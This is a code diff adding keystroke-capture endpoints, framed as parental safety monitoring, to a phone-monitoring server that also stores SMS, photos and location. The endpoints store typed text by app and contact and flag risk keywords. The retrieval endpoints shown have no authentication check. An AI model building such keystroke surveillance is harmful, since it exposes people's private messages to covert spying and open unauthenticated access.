@@ -1,6 +1,6 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, User } = require('../models');
+const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, KeystrokeSession, User } = require('../models');
 
 const router = express.Router();
 
@@ -965,6 +965,340 @@ router.get('/browser-history/:deviceId', async (req, res) => {
   } catch (error) {
     console.error('Get browser history error:', error);
     res.status(500).json({ error: 'Failed to get browser history' });
+  }
+});
+
+// =============================================
+// KEYSTROKE MONITORING ENDPOINTS
+// =============================================
+
+// Risk keywords for analysis (parent safety monitoring)
+const RISK_KEYWORDS = {
+  HIGH: [
+    'suicide', 'kill myself', 'end my life', 'want to die', 'cutting', 'self harm',
+    'drugs', 'overdose', 'cocaine', 'heroin', 'meth', 'dealer',
+    'nude', 'naked', 'send pics', 'your body', 'meet up alone', 'dont tell anyone',
+    'gun', 'weapon', 'knife', 'hurt someone'
+  ],
+  MEDIUM: [
+    'bully', 'hate you', 'kill', 'fight', 'hurt', 'stupid', 'ugly',
+    'alcohol', 'beer', 'drunk', 'wasted', 'high', 'smoke', 'vape',
+    'sneak out', 'skip school', 'fake id', 'lie to parents',
+    'depressed', 'anxious', 'scared', 'alone', 'nobody likes me'
+  ]
+};
+
+// Analyze text for risk indicators
+function analyzeRisk(text) {
+  const lowerText = text.toLowerCase();
+  const flaggedKeywords = [];
+  
+  // Check HIGH risk keywords
+  for (const keyword of RISK_KEYWORDS.HIGH) {
+    if (lowerText.includes(keyword.toLowerCase())) {
+      flaggedKeywords.push(keyword);
+    }
+  }
+  if (flaggedKeywords.length > 0) {
+    return { riskLevel: 'HIGH', flaggedKeywords, sentiment: 'Negative' };
+  }
+  
+  // Check MEDIUM risk keywords
+  for (const keyword of RISK_KEYWORDS.MEDIUM) {
+    if (lowerText.includes(keyword.toLowerCase())) {
+      flaggedKeywords.push(keyword);
+    }
+  }
+  if (flaggedKeywords.length > 0) {
+    return { riskLevel: 'MEDIUM', flaggedKeywords, sentiment: 'Negative' };
+  }
+  
+  // Basic sentiment analysis
+  const positiveWords = ['love', 'happy', 'great', 'awesome', 'thanks', 'good', 'fun', 'excited'];
+  const negativeWords = ['sad', 'angry', 'mad', 'upset', 'bad', 'hate', 'worried'];
+  
+  let positiveCount = 0;
+  let negativeCount = 0;
+  
+  for (const word of positiveWords) {
+    if (lowerText.includes(word)) positiveCount++;
+  }
+  for (const word of negativeWords) {
+    if (lowerText.includes(word)) negativeCount++;
+  }
+  
+  const sentiment = positiveCount > negativeCount ? 'Positive' : 
+                   negativeCount > positiveCount ? 'Negative' : 'Neutral';
+  
+  return { riskLevel: 'LOW', flaggedKeywords: [], sentiment };
+}
+
+// POST: Sync keystrokes from device
+router.post('/keystrokes', async (req, res) => {
+  try {
+    const { deviceId, keystrokes } = req.body;
+    
+    if (!deviceId || !keystrokes || !Array.isArray(keystrokes)) {
+      return res.status(400).json({ error: 'deviceId and keystrokes array required' });
+    }
+    
+    console.log(`[Sync] Received ${keystrokes.length} keystrokes from device ${deviceId.substring(0, 8)}...`);
+    
+    // Verify device exists
+    let device = await Device.findOne({ deviceId: deviceId });
+    if (!device && mongoose.Types.ObjectId.isValid(deviceId)) {
+      device = await Device.findById(deviceId);
+    }
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    // Group keystrokes by sessionId
+    const sessionMap = new Map();
+    
+    for (const keystroke of keystrokes) {
+      const { sessionId, timestamp, packageName, appName, contactName, textContent, fieldType } = keystroke;
+      
+      if (!sessionId || !textContent) continue;
+      
+      if (!sessionMap.has(sessionId)) {
+        sessionMap.set(sessionId, {
+          deviceId: device.deviceId,
+          sessionId,
+          appPackage: packageName,
+          appName: appName || packageName,
+          contactName: contactName || 'Unknown',
+          messages: [],
+          firstMessageTime: new Date(timestamp),
+          lastMessageTime: new Date(timestamp)
+        });
+      }
+      
+      const session = sessionMap.get(sessionId);
+      session.messages.push({
+        timestamp: new Date(timestamp),
+        text: textContent,
+        fieldType: fieldType || 'text'
+      });
+      
+      // Update time bounds
+      const msgTime = new Date(timestamp);
+      if (msgTime < session.firstMessageTime) session.firstMessageTime = msgTime;
+      if (msgTime > session.lastMessageTime) session.lastMessageTime = msgTime;
+    }
+    
+    // Process and save/update sessions
+    let savedCount = 0;
+    for (const [sessionId, sessionData] of sessionMap) {
+      try {
+        // Combine all message text for risk analysis
+        const allText = sessionData.messages.map(m => m.text).join(' ');
+        const { riskLevel, flaggedKeywords, sentiment } = analyzeRisk(allText);
+        
+        // Upsert session - merge new messages with existing
+        const existingSession = await KeystrokeSession.findOne({ sessionId });
+        
+        if (existingSession) {
+          // Append new messages
+          existingSession.messages.push(...sessionData.messages);
+          existingSession.messageCount = existingSession.messages.length;
+          existingSession.lastMessageTime = sessionData.lastMessageTime;
+          
+          // Re-analyze combined text
+          const combinedText = existingSession.messages.map(m => m.text).join(' ');
+          const analysis = analyzeRisk(combinedText);
+          existingSession.riskLevel = analysis.riskLevel;
+          existingSession.flaggedKeywords = analysis.flaggedKeywords;
+          existingSession.sentiment = analysis.sentiment;
+          
+          await existingSession.save();
+        } else {
+          // Create new session
+          await KeystrokeSession.create({
+            ...sessionData,
+            messageCount: sessionData.messages.length,
+            riskLevel,
+            flaggedKeywords,
+            sentiment
+          });
+        }
+        
+        savedCount++;
+        
+        // Log high-risk sessions for monitoring
+        if (riskLevel === 'HIGH') {
+          console.log(`[ALERT] High-risk keystroke session detected for device ${device.name}: ${flaggedKeywords.join(', ')}`);
+        }
+        
+      } catch (error) {
+        if (error.code !== 11000) { // Ignore duplicate key errors
+          console.error(`Error saving session ${sessionId}:`, error.message);
+        }
+      }
+    }
+    
+    console.log(`[Sync] Saved/updated ${savedCount} keystroke sessions`);
+    
+    res.json({ success: true, sessionsProcessed: savedCount });
+    
+  } catch (error) {
+    console.error('Sync keystrokes error:', error);
+    res.status(500).json({ error: 'Failed to sync keystrokes' });
+  }
+});
+
+// GET: Retrieve keystroke sessions for a device
+router.get('/keystrokes/:deviceId', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const { 
+      page = 1, 
+      limit = 20, 
+      app, 
+      riskLevel, 
+      contact,
+      startDate,
+      endDate 
+    } = req.query;
+    
+    // Find device
+    let device = null;
+    if (mongoose.Types.ObjectId.isValid(deviceId)) {
+      device = await Device.findById(deviceId);
+    }
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceId });
+    }
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    // Build query
+    const query = { deviceId: device.deviceId };
+    
+    if (app) {
+      query.appPackage = app;
+    }
+    if (riskLevel) {
+      query.riskLevel = riskLevel;
+    }
+    if (contact) {
+      query.contactName = { $regex: contact, $options: 'i' };
+    }
+    if (startDate || endDate) {
+      query.lastMessageTime = {};
+      if (startDate) query.lastMessageTime.$gte = new Date(startDate);
+      if (endDate) query.lastMessageTime.$lte = new Date(endDate);
+    }
+    
+    const skip = (parseInt(page) - 1) * parseInt(limit);
+    
+    const sessions = await KeystrokeSession.find(query)
+      .sort({ lastMessageTime: -1 })
+      .skip(skip)
+      .limit(parseInt(limit));
+    
+    const total = await KeystrokeSession.countDocuments(query);
+    
+    // Calculate stats
+    const statsQuery = { deviceId: device.deviceId };
+    const [stats] = await KeystrokeSession.aggregate([
+      { $match: statsQuery },
+      { $group: {
+        _id: null,
+        totalSessions: { $sum: 1 },
+        totalMessages: { $sum: '$messageCount' },
+        highRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'HIGH'] }, 1, 0] } },
+        mediumRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'MEDIUM'] }, 1, 0] } }
+      }}
+    ]);
+    
+    res.json({
+      success: true,
+      sessions,
+      total,
+      page: parseInt(page),
+      limit: parseInt(limit),
+      stats: stats || {
+        totalSessions: 0,
+        totalMessages: 0,
+        highRiskCount: 0,
+        mediumRiskCount: 0
+      }
+    });
+    
+  } catch (error) {
+    console.error('Get keystrokes error:', error);
+    res.status(500).json({ error: 'Failed to get keystrokes' });
+  }
+});
+
+// GET: Get keystroke statistics summary
+router.get('/keystrokes/:deviceId/stats', async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    
+    // Find device
+    let device = null;
+    if (mongoose.Types.ObjectId.isValid(deviceId)) {
+      device = await Device.findById(deviceId);
+    }
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceId });
+    }
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    // Aggregate stats
+    const [stats] = await KeystrokeSession.aggregate([
+      { $match: { deviceId: device.deviceId } },
+      { $group: {
+        _id: null,
+        totalSessions: { $sum: 1 },
+        totalMessages: { $sum: '$messageCount' },
+        highRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'HIGH'] }, 1, 0] } },
+        mediumRiskCount: { $sum: { $cond: [{ $eq: ['$riskLevel', 'MEDIUM'] }, 1, 0] } }
+      }}
+    ]);
+    
+    // Get top apps
+    const topApps = await KeystrokeSession.aggregate([
+      { $match: { deviceId: device.deviceId } },
+      { $group: {
+        _id: '$appPackage',
+        appName: { $first: '$appName' },
+        sessionCount: { $sum: 1 },
+        messageCount: { $sum: '$messageCount' }
+      }},
+      { $sort: { messageCount: -1 } },
+      { $limit: 5 }
+    ]);
+    
+    // Get recent high-risk sessions
+    const highRiskSessions = await KeystrokeSession.find({
+      deviceId: device.deviceId,
+      riskLevel: 'HIGH'
+    })
+      .sort({ lastMessageTime: -1 })
+      .limit(5)
+      .select('appName contactName flaggedKeywords lastMessageTime');
+    
+    res.json({
+      success: true,
+      stats: stats || {
+        totalSessions: 0,
+        totalMessages: 0,
+        highRiskCount: 0,
+        mediumRiskCount: 0
+      },
+      topApps,
+      highRiskSessions
+    });
+    
+  } catch (error) {
+    console.error('Get keystroke stats error:', error);
+    res.status(500).json({ error: 'Failed to get keystroke stats' });
   }
 });
 
